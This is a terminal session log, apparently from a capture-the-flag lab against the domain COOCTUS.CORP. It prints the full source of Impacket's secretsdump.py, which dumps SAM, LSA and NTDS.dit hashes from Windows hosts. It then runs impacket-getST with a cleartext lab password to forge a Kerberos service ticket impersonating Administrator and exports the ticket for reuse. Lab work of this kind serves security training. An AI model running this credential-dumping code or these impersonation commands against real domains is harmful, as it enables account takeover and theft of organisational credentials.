+Collecting ldap3!=2.5.0,!=2.5.2,!=2.6,>=2.5 (from -r impacket-0.11.0/requirements.txt (line 7))
+  Downloading ldap3-2.9.1-py2.py3-none-any.whl.metadata (5.4 kB)
+Collecting ldapdomaindump>=0.9.0 (from -r impacket-0.11.0/requirements.txt (line 8))
+  Downloading ldapdomaindump-0.10.0-py3-none-any.whl.metadata (512 bytes)
+Collecting flask>=1.0 (from -r impacket-0.11.0/requirements.txt (line 9))
+  Downloading flask-3.1.3-py3-none-any.whl.metadata (3.2 kB)
+Collecting dsinternals (from -r impacket-0.11.0/requirements.txt (line 11))
+  Downloading dsinternals-1.2.5-py3-none-any.whl.metadata (2.0 kB)
+Collecting cryptography<51,>=49.0.0 (from pyOpenSSL>=21.0.0->-r impacket-0.11.0/requirements.txt (line 6))
+  Downloading cryptography-50.0.1-cp311-abi3-manylinux_2_34_x86_64.whl.metadata (4.3 kB)
+Collecting cffi>=2.0.0 (from cryptography<51,>=49.0.0->pyOpenSSL>=21.0.0->-r impacket-0.11.0/requirements.txt (line 6))
+  Downloading cffi-2.1.1-cp313-cp313-manylinux2014_x86_64.manylinux_2_17_x86_64.whl.metadata (2.5 kB)
+Collecting dnspython (from ldapdomaindump>=0.9.0->-r impacket-0.11.0/requirements.txt (line 8))
+  Downloading dnspython-2.8.0-py3-none-any.whl.metadata (5.7 kB)
+Collecting blinker>=1.9.0 (from flask>=1.0->-r impacket-0.11.0/requirements.txt (line 9))
+  Downloading blinker-1.9.0-py3-none-any.whl.metadata (1.6 kB)
+Collecting click>=8.1.3 (from flask>=1.0->-r impacket-0.11.0/requirements.txt (line 9))
+  Downloading click-8.5.0-py3-none-any.whl.metadata (2.6 kB)
+Collecting itsdangerous>=2.2.0 (from flask>=1.0->-r impacket-0.11.0/requirements.txt (line 9))
+  Downloading itsdangerous-2.2.0-py3-none-any.whl.metadata (1.9 kB)
+Collecting jinja2>=3.1.2 (from flask>=1.0->-r impacket-0.11.0/requirements.txt (line 9))
+  Downloading jinja2-3.1.6-py3-none-any.whl.metadata (2.9 kB)
+Collecting markupsafe>=2.1.1 (from flask>=1.0->-r impacket-0.11.0/requirements.txt (line 9))
+  Using cached markupsafe-3.0.3-cp313-cp313-manylinux2014_x86_64.manylinux_2_17_x86_64.manylinux_2_28_x86_64.whl.metadata (2.7 kB)
+Collecting werkzeug>=3.1.0 (from flask>=1.0->-r impacket-0.11.0/requirements.txt (line 9))
+  Downloading werkzeug-3.1.8-py3-none-any.whl.metadata (4.0 kB)
+Collecting pycparser (from cffi>=2.0.0->cryptography<51,>=49.0.0->pyOpenSSL>=21.0.0->-r impacket-0.11.0/requirements.txt (line 6))
+  Using cached pycparser-3.0-py3-none-any.whl.metadata (8.2 kB)
+Downloading future-1.0.0-py3-none-any.whl (491 kB)
+Using cached six-1.17.0-py2.py3-none-any.whl (11 kB)
+Downloading charset_normalizer-3.5.1-cp313-cp313-manylinux2014_x86_64.manylinux_2_17_x86_64.manylinux_2_28_x86_64.whl (250 kB)
+Downloading pyasn1-0.6.4-py3-none-any.whl (84 kB)
+Downloading pycryptodomex-3.23.0-cp37-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (2.3 MB)
+   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 2.3/2.3 MB 9.4 MB/s  0:00:00
+Downloading pyopenssl-26.4.0-py3-none-any.whl (56 kB)
+Downloading cryptography-50.0.1-cp311-abi3-manylinux_2_34_x86_64.whl (4.7 MB)
+   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 4.7/4.7 MB 13.6 MB/s  0:00:00
+Downloading ldap3-2.9.1-py2.py3-none-any.whl (432 kB)
+Downloading ldapdomaindump-0.10.0-py3-none-any.whl (19 kB)
+Downloading flask-3.1.3-py3-none-any.whl (103 kB)
+Downloading dsinternals-1.2.5-py3-none-any.whl (200 kB)
+Downloading blinker-1.9.0-py3-none-any.whl (8.5 kB)
+Downloading cffi-2.1.1-cp313-cp313-manylinux2014_x86_64.manylinux_2_17_x86_64.whl (221 kB)
+Downloading click-8.5.0-py3-none-any.whl (125 kB)
+Downloading itsdangerous-2.2.0-py3-none-any.whl (16 kB)
+Downloading jinja2-3.1.6-py3-none-any.whl (134 kB)
+Using cached markupsafe-3.0.3-cp313-cp313-manylinux2014_x86_64.manylinux_2_17_x86_64.manylinux_2_28_x86_64.whl (22 kB)
+Downloading werkzeug-3.1.8-py3-none-any.whl (226 kB)
+Downloading dnspython-2.8.0-py3-none-any.whl (331 kB)
+Using cached pycparser-3.0-py3-none-any.whl (48 kB)
+Installing collected packages: six, pycryptodomex, pycparser, pyasn1, markupsafe, itsdangerous, future, dnspython, click, charset_normalizer, blinker, werkzeug, ldap3, jinja2, cffi, ldapdomaindump, flask, cryptography, pyOpenSSL, dsinternals
+Successfully installed blinker-1.9.0 cffi-2.1.1 charset_normalizer-3.5.1 click-8.5.0 cryptography-50.0.1 dnspython-2.8.0 dsinternals-1.2.5 flask-3.1.3 future-1.0.0 itsdangerous-2.2.0 jinja2-3.1.6 ldap3-2.9.1 ldapdomaindump-0.10.0 markupsafe-3.0.3 pyOpenSSL-26.4.0 pyasn1-0.6.4 pycparser-3.0 pycryptodomex-3.23.0 six-1.17.0 werkzeug-3.1.8
+
+┌──(thmenv)─(kali㉿kali)-[~/Downloads]
+└─$ ls impacket-0.11.0
+ChangeLog.md  impacket           LICENSE      PKG-INFO   requirements.txt  setup.cfg  TESTING.md  tox.ini
+examples      impacket.egg-info  MANIFEST.in  README.md  SECURITY.md       setup.py   tests
+
+┌──(thmenv)─(kali㉿kali)-[~/Downloads]
+└─$ ls impacket-0.11.0/impacket
+cdp.py              eap.py             __init__.py               nmb.py             smbserver.py
+crypto.py           ese.py             IP6_Address.py            nt_errors.py       spnego.py
+dcerpc              examples           IP6_Extension_Headers.py  ntlm.py            structure.py
+dhcp.py             helper.py          IP6.py                    pcapfile.py        system_errors.py
+dns.py              hresult_errors.py  krb5                      pcap_linktypes.py  tds.py
+Dot11Crypto.py      http.py            ldap                      smb3.py            uuid.py
+Dot11KeyManager.py  ICMP6.py           mapi_constants.py         smb3structs.py     version.py
+dot11.py            ImpactDecoder.py   mqtt.py                   smbconnection.py   winregistry.py
+dpapi.py            ImpactPacket.py    NDP.py                    smb.py             wps.py
+
+┌──(thmenv)─(kali㉿kali)-[~/Downloads]
+└─$ find -f secretsdump.py -maxdepth 5 .
+find: unknown predicate `-f'
+
+┌──(thmenv)─(kali㉿kali)-[~/Downloads]
+└─$ find -f secretsdump.py -maxdepth 5 .
+find: unknown predicate `-f'
+
+┌──(thmenv)─(kali㉿kali)-[~/Downloads]
+└─$ find -file secretsdump.py -maxdepth 5 .
+find: unknown predicate `-file'
+
+┌──(thmenv)─(kali㉿kali)-[~/Downloads]
+└─$ find . -name secretsdump.py -maxdepth 5
+find: warning: you have specified the global option -maxdepth after the argument -name, but global options are not positional, i.e., -maxdepth affects tests specified before it as well as those specified after it.  Please specify global options before other arguments.
+./impacket-0.11.0/impacket/examples/secretsdump.py
+./impacket-0.11.0/examples/secretsdump.py
+
+┌──(thmenv)─(kali㉿kali)-[~/Downloads]
+└─$ cat ./impacket-0.11.0/examples/secretsdump.py
+#!/usr/bin/env python
+# Impacket - Collection of Python classes for working with network protocols.
+#
+# Copyright (C) 2023 Fortra. All rights reserved.
+#
+# This software is provided under a slightly modified version
+# of the Apache Software License. See the accompanying LICENSE file
+# for more information.
+#
+# Description:
+#   Performs various techniques to dump hashes from the
+#   remote machine without executing any agent there.
+#   For SAM and LSA Secrets (including cached creds)
+#   we try to read as much as we can from the registry
+#   and then we save the hives in the target system
+#   (%SYSTEMROOT%\\Temp dir) and read the rest of the
+#   data from there.
+#   For NTDS.dit we either:
+#       a. Get the domain users list and get its hashes
+#          and Kerberos keys using [MS-DRDS] DRSGetNCChanges()
+#          call, replicating just the attributes we need.
+#       b. Extract NTDS.dit via vssadmin executed  with the
+#          smbexec approach.
+#          It's copied on the temp dir and parsed remotely.
+#
+#   The script initiates the services required for its working
+#   if they are not available (e.g. Remote Registry, even if it is
+#   disabled). After the work is done, things are restored to the
+#   original state.
+#
+# Author:
+#   Alberto Solino (@agsolino)
+#
+# References:
+#   Most of the work done by these guys. I just put all
+#   the pieces together, plus some extra magic.
+#
+#   - https://github.com/gentilkiwi/kekeo/tree/master/dcsync
+#   - https://moyix.blogspot.com.ar/2008/02/syskey-and-sam.html
+#   - https://moyix.blogspot.com.ar/2008/02/decrypting-lsa-secrets.html
+#   - https://moyix.blogspot.com.ar/2008/02/cached-domain-credentials.html
+#   - https://web.archive.org/web/20130901115208/www.quarkslab.com/en-blog+read+13
+#   - https://code.google.com/p/creddump/
+#   - https://lab.mediaservice.net/code/cachedump.rb
+#   - https://insecurety.net/?p=768
+#   - https://web.archive.org/web/20190717124313/http://www.beginningtoseethelight.org/ntsecurity/index.htm
+#   - https://www.exploit-db.com/docs/english/18244-active-domain-offline-hash-dump-&-forensic-analysis.pdf
+#   - https://www.passcape.com/index.php?section=blog&cmd=details&id=15
+#
+
+from __future__ import division
+from __future__ import print_function
+import argparse
+import codecs
+import logging
+import os
+import sys
+
+from impacket import version
+from impacket.examples import logger
+from impacket.examples.utils import parse_target
+from impacket.smbconnection import SMBConnection
+from impacket.ldap.ldap import LDAPConnection, LDAPSessionError
+
+from impacket.examples.secretsdump import LocalOperations, RemoteOperations, SAMHashes, LSASecrets, NTDSHashes, \
+    KeyListSecrets
+from impacket.krb5.keytab import Keytab
+try:
+    input = raw_input
+except NameError:
+    pass
+
+class DumpSecrets:
+    def __init__(self, remoteName, username='', password='', domain='', options=None):
+        self.__useVSSMethod = options.use_vss
+        self.__useKeyListMethod = options.use_keylist
+        self.__remoteName = remoteName
+        self.__remoteHost = options.target_ip
+        self.__username = username
+        self.__password = password
+        self.__domain = domain
+        self.__lmhash = ''
+        self.__nthash = ''
+        self.__aesKey = options.aesKey
+        self.__aesKeyRodc = options.rodcKey
+        self.__smbConnection = None
+        self.__ldapConnection = None
+        self.__remoteOps = None
+        self.__SAMHashes = None
+        self.__NTDSHashes = None
+        self.__LSASecrets = None
+        self.__KeyListSecrets = None
+        self.__rodc = options.rodcNo
+        self.__systemHive = options.system
+        self.__bootkey = options.bootkey
+        self.__securityHive = options.security
+        self.__samHive = options.sam
+        self.__ntdsFile = options.ntds
+        self.__history = options.history
+        self.__noLMHash = True
+        self.__isRemote = True
+        self.__outputFileName = options.outputfile
+        self.__doKerberos = options.k
+        self.__justDC = options.just_dc
+        self.__justDCNTLM = options.just_dc_ntlm
+        self.__justUser = options.just_dc_user
+        self.__ldapFilter = options.ldapfilter
+        self.__pwdLastSet = options.pwd_last_set
+        self.__printUserStatus= options.user_status
+        self.__resumeFileName = options.resumefile
+        self.__canProcessSAMLSA = True
+        self.__kdcHost = options.dc_ip
+        self.__options = options
+
+        if options.hashes is not None:
+            self.__lmhash, self.__nthash = options.hashes.split(':')
+
+    def connect(self):
+        self.__smbConnection = SMBConnection(self.__remoteName, self.__remoteHost)
+        if self.__doKerberos:
+            self.__smbConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash,
+                                               self.__nthash, self.__aesKey, self.__kdcHost)
+        else:
+            self.__smbConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
+
+    def ldapConnect(self):
+        if self.__doKerberos:
+            self.__target = self.__remoteHost
+        else:
+            if self.__kdcHost is not None:
+                self.__target = self.__kdcHost
+            else:
+                self.__target = self.__domain
+
+        # Create the baseDN
+        if self.__domain:
+            domainParts = self.__domain.split('.')
+        else:
+            domain = self.__target.split('.', 1)[-1]
+            domainParts = domain.split('.')
+        self.baseDN = ''
+        for i in domainParts:
+            self.baseDN += 'dc=%s,' % i
+        # Remove last ','
+        self.baseDN = self.baseDN[:-1]
+
+        try:
+            self.__ldapConnection = LDAPConnection('ldap://%s' % self.__target, self.baseDN, self.__kdcHost)
+            if self.__doKerberos is not True:
+                self.__ldapConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
+            else:
+                self.__ldapConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
+                                                    self.__aesKey, kdcHost=self.__kdcHost)
+        except LDAPSessionError as e:
+            if str(e).find('strongerAuthRequired') >= 0:
+                # We need to try SSL
+                self.__ldapConnection = LDAPConnection('ldaps://%s' % self.__target, self.baseDN, self.__kdcHost)
+                if self.__doKerberos is not True:
+                    self.__ldapConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
+                else:
+                    self.__ldapConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
+                                                        self.__aesKey, kdcHost=self.__kdcHost)
+            else:
+                raise
+
+    def dump(self):
+        try:
+            if self.__remoteName.upper() == 'LOCAL' and self.__username == '':
+                self.__isRemote = False
+                self.__useVSSMethod = True
+                if self.__systemHive:
+                    localOperations = LocalOperations(self.__systemHive)
+                    bootKey = localOperations.getBootKey()
+                    if self.__ntdsFile is not None:
+                    # Let's grab target's configuration about LM Hashes storage
+                        self.__noLMHash = localOperations.checkNoLMHashPolicy()
+                else:
+                    import binascii
+                    bootKey = binascii.unhexlify(self.__bootkey)
+
+            else:
+                self.__isRemote = True
+                bootKey = None
+                if self.__ldapFilter is not None:
+                    logging.info('Querying %s for information about domain users via LDAP' % self.__domain)
+                    try:
+                        self.ldapConnect()
+                    except Exception as e:
+                        logging.error('LDAP connection failed: %s' % str(e))
+                try:
+                    try:
+                        self.connect()
+                    except Exception as e:
+                        if os.getenv('KRB5CCNAME') is not None and self.__doKerberos is True:
+                            # SMBConnection failed. That might be because there was no way to log into the
+                            # target system. We just have a last resort. Hope we have tickets cached and that they
+                            # will work
+                            logging.debug('SMBConnection didn\'t work, hoping Kerberos will help (%s)' % str(e))
+                            pass
+                        else:
+                            raise
+
+                    self.__remoteOps  = RemoteOperations(self.__smbConnection, self.__doKerberos, self.__kdcHost, self.__ldapConnection)
+                    self.__remoteOps.setExecMethod(self.__options.exec_method)
+                    if self.__justDC is False and self.__justDCNTLM is False and self.__useKeyListMethod is False or self.__useVSSMethod is True:
+                        self.__remoteOps.enableRegistry()
+                        bootKey = self.__remoteOps.getBootKey()
+                        # Let's check whether target system stores LM Hashes
+                        self.__noLMHash = self.__remoteOps.checkNoLMHashPolicy()
+                except Exception as e:
+                    self.__canProcessSAMLSA = False
+                    if str(e).find('STATUS_USER_SESSION_DELETED') and os.getenv('KRB5CCNAME') is not None \
+                        and self.__doKerberos is True:
+                        # Giving some hints here when SPN target name validation is set to something different to Off
+                        # This will prevent establishing SMB connections using TGS for SPNs different to cifs/
+                        logging.error('Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user')
+                    else:
+                        logging.error('RemoteOperations failed: %s' % str(e))
+
+            # If the KerberosKeyList method is enable we dump the secrets only via TGS-REQ
+            if self.__useKeyListMethod is True:
+                try:
+                    self.__KeyListSecrets = KeyListSecrets(self.__domain, self.__remoteName, self.__rodc, self.__aesKeyRodc, self.__remoteOps)
+                    self.__KeyListSecrets.dump()
+                except Exception as e:
+                    logging.error('Something went wrong with the Kerberos Key List approach.: %s' % str(e))
+            else:
+                # If RemoteOperations succeeded, then we can extract SAM and LSA
+                if self.__justDC is False and self.__justDCNTLM is False and self.__canProcessSAMLSA:
+                    try:
+                        if self.__isRemote is True:
+                            SAMFileName = self.__remoteOps.saveSAM()
+                        else:
+                            SAMFileName = self.__samHive
+
+                        self.__SAMHashes = SAMHashes(SAMFileName, bootKey, isRemote = self.__isRemote)
+                        self.__SAMHashes.dump()
+                        if self.__outputFileName is not None:
+                            self.__SAMHashes.export(self.__outputFileName)
+                    except Exception as e:
+                        logging.error('SAM hashes extraction failed: %s' % str(e))
+
+                    try:
+                        if self.__isRemote is True:
+                            SECURITYFileName = self.__remoteOps.saveSECURITY()
+                        else:
+                            SECURITYFileName = self.__securityHive
+
+                        self.__LSASecrets = LSASecrets(SECURITYFileName, bootKey, self.__remoteOps,
+                                                       isRemote=self.__isRemote, history=self.__history)
+                        self.__LSASecrets.dumpCachedHashes()
+                        if self.__outputFileName is not None:
+                            self.__LSASecrets.exportCached(self.__outputFileName)
+                        self.__LSASecrets.dumpSecrets()
+                        if self.__outputFileName is not None:
+                            self.__LSASecrets.exportSecrets(self.__outputFileName)
+                    except Exception as e:
+                        if logging.getLogger().level == logging.DEBUG:
+                            import traceback
+                            traceback.print_exc()
+                        logging.error('LSA hashes extraction failed: %s' % str(e))
+
+                # NTDS Extraction we can try regardless of RemoteOperations failing. It might still work
+                if self.__isRemote is True:
+                    if self.__useVSSMethod and self.__remoteOps is not None and self.__remoteOps.getRRP() is not None:
+                        NTDSFileName = self.__remoteOps.saveNTDS()
+                    else:
+                        NTDSFileName = None
+                else:
+                    NTDSFileName = self.__ntdsFile
+
+                self.__NTDSHashes = NTDSHashes(NTDSFileName, bootKey, isRemote=self.__isRemote, history=self.__history,
+                                               noLMHash=self.__noLMHash, remoteOps=self.__remoteOps,
+                                               useVSSMethod=self.__useVSSMethod, justNTLM=self.__justDCNTLM,
+                                               pwdLastSet=self.__pwdLastSet, resumeSession=self.__resumeFileName,
+                                               outputFileName=self.__outputFileName, justUser=self.__justUser,
+                                               ldapFilter=self.__ldapFilter, printUserStatus=self.__printUserStatus)
+                try:
+                    self.__NTDSHashes.dump()
+                except Exception as e:
+                    if logging.getLogger().level == logging.DEBUG:
+                        import traceback
+                        traceback.print_exc()
+                    if str(e).find('ERROR_DS_DRA_BAD_DN') >= 0:
+                        # We don't store the resume file if this error happened, since this error is related to lack
+                        # of enough privileges to access DRSUAPI.
+                        resumeFile = self.__NTDSHashes.getResumeSessionFile()
+                        if resumeFile is not None:
+                            os.unlink(resumeFile)
+                    logging.error(e)
+                    if (self.__justUser or self.__ldapFilter) and str(e).find("ERROR_DS_NAME_ERROR_NOT_UNIQUE") >= 0:
+                        logging.info("You just got that error because there might be some duplicates of the same name. "
+                                     "Try specifying the domain name for the user as well. It is important to specify it "
+                                     "in the form of NetBIOS domain name/user (e.g. contoso/Administratror).")
+                    elif self.__useVSSMethod is False:
+                        logging.info('Something went wrong with the DRSUAPI approach. Try again with -use-vss parameter')
+                self.cleanup()
+        except (Exception, KeyboardInterrupt) as e:
+            if logging.getLogger().level == logging.DEBUG:
+                import traceback
+                traceback.print_exc()
+            logging.error(e)
+            if self.__NTDSHashes is not None:
+                if isinstance(e, KeyboardInterrupt):
+                    while True:
+                        answer =  input("Delete resume session file? [y/N] ")
+                        if answer.upper() == '':
+                            answer = 'N'
+                            break
+                        elif answer.upper() == 'Y':
+                            answer = 'Y'
+                            break
+                        elif answer.upper() == 'N':
+                            answer = 'N'
+                            break
+                    if answer == 'Y':
+                        resumeFile = self.__NTDSHashes.getResumeSessionFile()
+                        if resumeFile is not None:
+                            os.unlink(resumeFile)
+            try:
+                self.cleanup()
+            except:
+                pass
+
+    def cleanup(self):
+        logging.info('Cleaning up... ')
+        if self.__remoteOps:
+            self.__remoteOps.finish()
+        if self.__SAMHashes:
+            self.__SAMHashes.finish()
+        if self.__LSASecrets:
+            self.__LSASecrets.finish()
+        if self.__NTDSHashes:
+            self.__NTDSHashes.finish()
+        if self.__KeyListSecrets:
+            self.__KeyListSecrets.finish()
+
+
+# Process command-line arguments.
+if __name__ == '__main__':
+    # Explicitly changing the stdout encoding format
+    if sys.stdout.encoding is None:
+        # Output is redirected to a file
+        sys.stdout = codecs.getwriter('utf8')(sys.stdout)
+
+    print(version.BANNER)
+
+    parser = argparse.ArgumentParser(add_help = True, description = "Performs various techniques to dump secrets from "
+                                                      "the remote machine without executing any agent there.")
+
+    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address> or LOCAL'
+                                                       ' (if you want to parse local files)')
+    parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
+    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
+    parser.add_argument('-system', action='store', help='SYSTEM hive to parse')
+    parser.add_argument('-bootkey', action='store', help='bootkey for SYSTEM hive')
+    parser.add_argument('-security', action='store', help='SECURITY hive to parse')
+    parser.add_argument('-sam', action='store', help='SAM hive to parse')
+    parser.add_argument('-ntds', action='store', help='NTDS.DIT file to parse')
+    parser.add_argument('-resumefile', action='store', help='resume file name to resume NTDS.DIT session dump (only '
+                         'available to DRSUAPI approach). This file will also be used to keep updating the session\'s '
+                         'state')
+    parser.add_argument('-outputfile', action='store',
+                        help='base output filename. Extensions will be added for sam, secrets, cached and ntds')
+    parser.add_argument('-use-vss', action='store_true', default=False,
+                        help='Use the VSS method instead of default DRSUAPI')
+    parser.add_argument('-rodcNo', action='store', type=int, help='Number of the RODC krbtgt account (only avaiable for Kerb-Key-List approach)')
+    parser.add_argument('-rodcKey', action='store', help='AES key of the Read Only Domain Controller (only avaiable for Kerb-Key-List approach)')
+    parser.add_argument('-use-keylist', action='store_true', default=False,
+                        help='Use the Kerb-Key-List method instead of default DRSUAPI')
+    parser.add_argument('-exec-method', choices=['smbexec', 'wmiexec', 'mmcexec'], nargs='?', default='smbexec', help='Remote exec '
+                        'method to use at target (only when using -use-vss). Default: smbexec')
+
+    group = parser.add_argument_group('display options')
+    group.add_argument('-just-dc-user', action='store', metavar='USERNAME',
+                       help='Extract only NTDS.DIT data for the user specified. Only available for DRSUAPI approach. '
+                            'Implies also -just-dc switch')
+    group.add_argument('-ldapfilter', action='store', metavar='LDAPFILTER',
+                       help='Extract only NTDS.DIT data for specific users based on an LDAP filter. '
+                            'Only available for DRSUAPI approach. Implies also -just-dc switch')
+    group.add_argument('-just-dc', action='store_true', default=False,
+                        help='Extract only NTDS.DIT data (NTLM hashes and Kerberos keys)')
+    group.add_argument('-just-dc-ntlm', action='store_true', default=False,
+                       help='Extract only NTDS.DIT data (NTLM hashes only)')
+    group.add_argument('-pwd-last-set', action='store_true', default=False,
+                       help='Shows pwdLastSet attribute for each NTDS.DIT account. Doesn\'t apply to -outputfile data')
+    group.add_argument('-user-status', action='store_true', default=False,
+                        help='Display whether or not the user is disabled')
+    group.add_argument('-history', action='store_true', help='Dump password history, and LSA secrets OldVal')
+
+    group = parser.add_argument_group('authentication')
+    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
+    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
+    group.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
+                             '(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use'
+                             ' the ones specified in the command line')
+    group.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication'
+                                                                            ' (128 or 256 bits)')
+    group.add_argument('-keytab', action="store", help='Read keys for SPN from keytab file')
+
+    group = parser.add_argument_group('connection')
+    group.add_argument('-dc-ip', action='store',metavar = "ip address",  help='IP Address of the domain controller. If '
+                                 'ommited it use the domain part (FQDN) specified in the target parameter')
+    group.add_argument('-target-ip', action='store', metavar="ip address",
+                       help='IP Address of the target machine. If omitted it will use whatever was specified as target. '
+                            'This is useful when target is the NetBIOS name and you cannot resolve it')
+
+    if len(sys.argv)==1:
+        parser.print_help()
+        sys.exit(1)
+
+    options = parser.parse_args()
+
+    # Init the example's logger theme
+    logger.init(options.ts)
+
+    if options.debug is True:
+        logging.getLogger().setLevel(logging.DEBUG)
+        # Print the Library's installation path
+        logging.debug(version.getInstallationPath())
+    else:
+        logging.getLogger().setLevel(logging.INFO)
+
+    domain, username, password, remoteName = parse_target(options.target)
+
+    if options.just_dc_user is not None or options.ldapfilter is not None:
+        if options.use_vss is True:
+            logging.error('-just-dc-user switch is not supported in VSS mode')
+            sys.exit(1)
+        elif options.resumefile is not None:
+            logging.error('resuming a previous NTDS.DIT dump session not compatible with -just-dc-user switch')
+            sys.exit(1)
+        elif remoteName.upper() == 'LOCAL' and username == '':
+            logging.error('-just-dc-user not compatible in LOCAL mode')
+            sys.exit(1)
+        else:
+            # Having this switch on implies not asking for anything else.
+            options.just_dc = True
+
+    if options.use_vss is True and options.resumefile is not None:
+        logging.error('resuming a previous NTDS.DIT dump session is not supported in VSS mode')
+        sys.exit(1)
+
+    if options.use_keylist is True and (options.rodcNo is None or options.rodcKey is None):
+        logging.error('Both the RODC ID number and the RODC key are required for the Kerb-Key-List approach')
+        sys.exit(1)
+
+    if remoteName.upper() == 'LOCAL' and username == '' and options.resumefile is not None:
+        logging.error('resuming a previous NTDS.DIT dump session is not supported in LOCAL mode')
+        sys.exit(1)
+
+    if remoteName.upper() == 'LOCAL' and username == '':
+        if options.system is None and options.bootkey is None:
+            logging.error('Either the SYSTEM hive or bootkey is required for local parsing, check help')
+            sys.exit(1)
+    else:
+
+        if options.target_ip is None:
+            options.target_ip = remoteName
+
+        if domain is None:
+            domain = ''
+
+        if options.keytab is not None:
+            Keytab.loadKeysFromKeytab(options.keytab, username, domain, options)
+            options.k = True
+
+        if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
+            from getpass import getpass
+
+            password = getpass("Password:")
+
+        if options.aesKey is not None:
+            options.k = True
+
+    dumper = DumpSecrets(remoteName, username, password, domain, options)
+    try:
+        dumper.dump()
+    except Exception as e:
+        if logging.getLogger().level == logging.DEBUG:
+            import traceback
+            traceback.print_exc()
+        logging.error(e)
+
+┌──(thmenv)─(kali㉿kali)-[~/Downloads]
+└─$ ./impacket-0.11.0/examples/secretsdump.py -k -no-pass DC.COOCTUS.CORP
+Traceback (most recent call last):
+  File "/home/kali/Downloads/./impacket-0.11.0/examples/secretsdump.py", line 59, in <module>
+    from impacket import version
+ModuleNotFoundError: No module named 'impacket'
+
+┌──(thmenv)─(kali㉿kali)-[~/Downloads]
+└─$ python ./impacket-0.11.0/examples/secretsdump.py -k -no-pass DC.COOCTUS.CORP
+Traceback (most recent call last):
+  File "/home/kali/Downloads/./impacket-0.11.0/examples/secretsdump.py", line 59, in <module>
+    from impacket import version
+ModuleNotFoundError: No module named 'impacket'
+
+┌──(thmenv)─(kali㉿kali)-[~/Downloads]
+└─$
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$ klist
+Ticket cache: FILE:Administrator.ccache
+Default principal: Administrator@COOCTUS.CORP
+
+Valid starting       Expires              Service principal
+09/09/2026 10:20:01  09/09/2026 20:14:08  oakley/DC.COOCTUS.CORP@COOCTUS.CORP
+        renew until 09/10/2026 10:14:08
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$ impacket-getST -spn oakley/DC.COOCTUS.CORP -impersonate Administrator "COOCTUS.CORP/password-reset:resetpassword" -dc-ip target.thm
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Getting TGT for user
+[*] Impersonating Administrator
+[*] Requesting S4U2self
+[*] Requesting S4U2Proxy
+[*] Saving ticket in Administrator@oakley_DC.COOCTUS.CORP@COOCTUS.CORP.ccache
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$ export KRB5CCNAME=Administrator@oakley_DC.COOCTUS.CORP@COOCTUS.CORP.ccache
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$ klist
+Ticket cache: FILE:Administrator@oakley_DC.COOCTUS.CORP@COOCTUS.CORP.ccache
+Default principal: Administrator@COOCTUS.CORP
+
+Valid starting       Expires              Service principal
+09/09/2026 11:27:55  09/09/2026 21:27:55  oakley/DC.COOCTUS.CORP@COOCTUS.CORP
+        renew until 09/10/2026 11:27:56
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$ cat /etc
+cat: /etc: Is a directory
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$ cat /etc/hosts
+Completing file
+adduser.conf               group                      mtab@                      security/
+adjtime                    group-                     mysql/                     selinux/
+alternatives/              grub.d/                    nanorc                     sensors3.conf
+apache2/                   gshadow                    netconfig                  sensors.d/
+apparmor/                  gshadow-                   netsniff-ng/               services
+apparmor.d/                gss/                       network/                   sgml/
+apt/                       gtk-2.0/                   NetworkManager/            shadow
+arp-scan/                  gtk-3.0/                   networks                   shadow-
+avahi/                     guymager/                  nfs.conf                   shells
+bash.bashrc                gvm/                       nfs.conf.d/                signon-ui/
+bash_completion            hdparm.conf                nftables.conf*             skel/
+bash_completion.d/         host.conf                  nginx/                     smartd.conf
+bindresvport.blacklist     hostname                   nikto.conf                 smartmontools/
+binfmt.d/                  hosts                      nsisconf.nsh               smi.conf
+bluetooth/                 hosts.allow                nsswitch.conf              snmp/
+ca-certificates/           hosts.deny                 ODBCDataSources/           speech-dispatcher/
+ca-certificates.conf       idmapd.conf                odbc.ini                   sqlmap/
+catdocrc                   ifplugd/                   odbcinst.ini               ssh/
+chatscripts/               ImageMagick-7/             openal/                    ssl/
+chromium/                  inetsim/                   OpenCL/                    sslsplit/
+chromium.d/                init.d/                    openni2/                   strongswan.conf
+cifs-utils/                initramfs-tools/           opensc/                    strongswan.d/
+cloud/                     inputrc                    openvas/                   stunnel/
+console-setup/             insserv.conf.d/            openvpn/                   subgid
+cracklib/                  ipp-usb/                   opt/                       subgid-
+credstore/                 ipsec.conf                 os-release@                subuid
+credstore.encrypted/       ipsec.d/                   PackageKit/                subuid-
+cron.d/                    ipsec.secrets              pam.conf                   subversion/
+cron.daily/                issue                      pam.d/                     sudo.conf
+cron.hourly/               issue.net                  paperspecs                 sudoers
+cron.monthly/              java-21-openjdk/           passwd                     sudoers.d/
+crontab                    java-25-openjdk/           passwd-                    sudo_logsrvd.conf
+cron.weekly/               john/                      perl/                      supercat/
+cron.yearly/               kali-menu/                 php/                       sv/
+cryptsetup-initramfs/      kernel/                    pki/                       sysctl.d/
